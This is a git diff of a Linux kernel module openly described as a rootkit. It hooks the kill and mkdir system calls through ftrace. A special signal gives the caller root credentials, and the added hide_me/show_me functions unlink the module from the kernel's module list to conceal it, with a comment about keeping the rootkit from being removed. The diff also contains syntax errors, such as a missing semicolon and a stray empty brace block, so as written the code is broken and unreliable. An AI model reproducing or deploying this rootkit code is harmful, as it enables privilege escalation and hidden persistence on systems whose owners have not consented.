@@ -15,7 +15,15 @@ MODULE_AUTHOR("infernexio");
 MODULE_DESCRIPTION("rootkit");
 MODULE_VERSION("0.0.1");
 
+
+enum signals{
+    SIGSUPER = 64, //become root
+    SIGINVIS = 63, // hide
+};
+
 unsigned long *__sys_call_table = NULL;
+static int hidden = 0;
+static struct list_head *prev_module;
 
 #ifdef CONFIG_X86_64
 /* on 64-bit x86 and kernel v4.17 syscalls are nolonger
@@ -38,22 +46,28 @@ static orig_mkdir_t orig_mkdir;
 #endif
 #endif
 
-enum signals{
-    SIGSUPER = 64, //become root
-    SIGINVIS = 63, // hide
-};
 
 #if PTREGS_SYSCALL_STUB
 static asmlinkage long hook_kill(const struct pt_regs *regs){
     int sig = regs->si;
     void set_root(void);
+    void hide_me(void);
+    void show_me(void)
 
     if(sig == SIGSUPER){
         printk(KERN_INFO "signal: %d == SIGSUPER %d | giving root privilges", sig, SIGSUPER);
         set_root();
         return 0;
-    }else if(sig == SIGINVIS){
-        printk(KERN_INFO "signal: %d == SIGINVIS :d | hide itself/malware/etc", sig, SIGINVIS);
+    }else if(sig == SIGINVIS && (hidden) == 0){}
+        printk(KERN_INFO "signal: %d == SIGINVIS %d | hiding the rootkit", sig, SIGINVIS);
+        hide_me();
+        hidden = 1;
+        return 0;
+    }else if(sig == SIGINVIS && (hidden) == 1){
+        /* This is only for testing we don't want anyone to get rid of our rootkit */
+        printk(KERN_INFO "signal: %d == SIGINVIS %d | reavling the rootkit", sig, SIGINVIS);
+        show_me();
+        hidden = 0;
         return 0;
     }
 
@@ -80,13 +94,23 @@ static asmlinkage int hook_mkdir(const struct pt_regs *regs){
 #else
 static asmlinkage long hook_kill(pid_t pid, int sig){
 	void set_root(void);
+    void hide_me(void);
+    void show_me(void);
     
     if(sig == SIGSUPER){
         printk(KERN_INFO "signal: %d == SIGSUPER %d | giving root priveliges", sig, SIGSUPER);
         set_root();
         return 0;
-    }else if(sig == SIGINVIS){
-        printk(KERN_INFO "signal: %d == SIGINVIS %d | hide itself/malware/etc", sig, SIGINVIS);
+    }else if(sig == SIGINVIS && (hidden) == 0){}
+        printk(KERN_INFO "signal: %d == SIGINVIS %d | hiding the rootkit", sig, SIGINVIS);
+        hide_me();
+        hidden = 1;
+        return 0;
+    }else if(sig == SIGINVIS && (hidden) == 1){
+        /* This is only for testing we don't want anyone to get rid of our rootkit */
+        printk(KERN_INFO "signal: %d == SIGINVIS %d | reavling the rootkit", sig, SIGINVIS);
+        show_me();
+        hidden = 0;
         return 0;
     }
     
@@ -111,44 +135,18 @@ static asmlinkage int hook_mkdir(const char __user *pathname, umode_t mode){
 }
 #endif
 
-//Older way to do the cleanup and hooking the ftrace functions are much easier
-/**
- * for clearn up after the syscall
-*/
-// static int cleanup(void){
-//     /* kill */
-//     __sys_call_table[__NR_kill] = (unsigned long)orig_kill;
+void hide_me(void){
+    prev_module = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+}
 
-//     return 0;
-// }
+void show_me(void){
+    list_add(&THIS_MODULE->list, prev_module);
+}
 
 /**
- * stores the id of the sys call to later hook
+ * changes the credentials of the given user to be root
 */
-// static int store(void){
-// /* if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0) syscall use pt_regs stub*/
-// #if PTREGS_SYSCALL_STUB
-//     /* kill */
-//     orig_kill = (ptregs_t)__sys_call_table[__NR_kill];
-//     printk(KERN_INFO "orig_kill table entry successfully sotred\n");
-
-// /* if LINUX_VERSION_CODE < KERNEL_VERSION(4,17,0) */
-// #else
-//     /* kill */
-//     orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
-//     printk(KERN_INFO "orig_kill table entry successfully sotred\n");
-// #endif
-
-//     return 0;
-    
-// }
-
-// static int hook(void){
-//     /* kill */
-//     __sys_call_table[__NR_kill] = (unsigned long)&hacked_kill;
-//     return 0;
-// }
-
 void set_root(void){
     struct cred *root;
     root = prepare_creds();
@@ -185,6 +183,7 @@ static void unprotect_memory(void){
     printk(KERN_INFO "unportected memory\n");
 }
 
+
 /**
  * enables memory protection
 */
@@ -210,6 +209,9 @@ static unsigned long *get_syscall_table(void){
         return syscall_table;
 }
 
+/**
+ * array of functins hooked by this rootkit
+*/
 static struct ftrace_hook hooks[] = {
     HOOK("sys_kill", hook_kill, &orig_kill),
     HOOK("sys_mkdir", hook_mkdir, &orig_mkdir),
@@ -271,3 +273,42 @@ static void __exit exit_func(void){
 */
 module_init(init_func);
 module_exit(exit_func);
+
+
+//Older way to do the cleanup and hooking the ftrace functions are much easier
+/**
+ * for clearn up after the syscall
+*/
+// static int cleanup(void){
+//     /* kill */
+//     __sys_call_table[__NR_kill] = (unsigned long)orig_kill;
+
+//     return 0;
+// }
+
+/**
+ * stores the id of the sys call to later hook
+*/
+// static int store(void){
+// /* if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0) syscall use pt_regs stub*/
+// #if PTREGS_SYSCALL_STUB
+//     /* kill */
+//     orig_kill = (ptregs_t)__sys_call_table[__NR_kill];
+//     printk(KERN_INFO "orig_kill table entry successfully sotred\n");
+
+// /* if LINUX_VERSION_CODE < KERNEL_VERSION(4,17,0) */
+// #else
+//     /* kill */
+//     orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
+//     printk(KERN_INFO "orig_kill table entry successfully sotred\n");
+// #endif
+
+//     return 0;
+    
+// }
+
+// static int hook(void){
+//     /* kill */
+//     __sys_call_table[__NR_kill] = (unsigned long)&hacked_kill;
+//     return 0;
+// }
